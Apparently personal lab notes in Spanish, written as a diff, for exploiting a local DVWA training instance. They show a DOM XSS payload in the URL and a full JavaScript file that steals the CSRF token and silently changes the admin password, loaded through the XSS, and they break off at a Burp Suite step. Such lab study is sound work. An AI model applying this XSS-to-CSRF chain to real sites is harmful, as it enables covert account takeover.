@@ -1,1 +1,76 @@
+++ Web Browser
+--- dvwa securiy = high
+--- XSS (DOM) ---> English ---> select 
+--- En la url agregar lo siguiente después de english: #<script>alert("Hacked")</script>
+--- Refrescar la página
+--- Aparecerá una ventana emergente que dirá hacked ---> ok
+--- Esto nos indica que el servidor es vulnerable a ataques XSS
+--- CSRF
 
+++ Text editor
+--- Crear un archivo llamado xss.js
+--- Ingresar en el archivo el siguiente código:
+
+
+var theURL = 'http://127.0.0.1/vulnerabilities/csrf/';
+var pass = 'admin';
+var xmlhttp; // Faltaba declarar la variable
+
+if(window.XMLHttpRequest) {
+    xmlhttp = new XMLHttpRequest();
+} else {
+    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+}
+
+xmlhttp.withCredentials = true;
+var hacked = false;
+
+// Primero hacer una petición GET para obtener la página y extraer el token
+xmlhttp.open('GET', theURL, false);
+xmlhttp.send();
+
+// Extraer el token CSRF de la respuesta
+var response = xmlhttp.responseText;
+var token = response.match(/user_token['"\s]+value=['"]([a-zA-Z0-9]+)['"]/)[1];
+
+// Ahora construir la URL con el token incluido y la contraseña definida
+theURL += '?password_new=' + pass + '&password_conf=' + pass + '&Change=Change&user_token=' + token;
+
+// Enviar la petición con el token
+xmlhttp.open('GET', theURL, false);
+xmlhttp.send();
+
+// Verificar si el ataque fue exitoso
+if(xmlhttp.status == 200 && xmlhttp.responseText.indexOf('Password Changed') > -1) {
+    hacked = true;
+    alert('Password changed to: ' + pass);
+}
+
+--- Guardar el archivo
+
+
+++ Terminal
+--- Navegar en la ruta donde esté el archivo .js
+--- Escribir el comando: python3 -m http.server 8080
+
+++ Web Browser
+--- 127.0.0.1:8080/<archivo.js>
+--- Se mostrará el código en el navegador
+--- Copiar la ruta del archivo
+--- XSS (DOM) ---> English ---> select 
+--- Cambiar el url siguiendo el siguiente formato:
+---- al final agregar: =English#<script src="<ruta_archivo>"> </script>
+--- Enter
+--- Abrir este url en una nueva pestaña
+---- Aparecerá un popup indicando got token <token> ---> ok
+----- En estos momentos las credenciales de la persona serán cambiadas sin 
+este darse cuenta
+--- Logout
+--- Usar las credenciales admin/admin
+
+
+
+
+++ Burp Suite
+--- Intercept on
+--- 
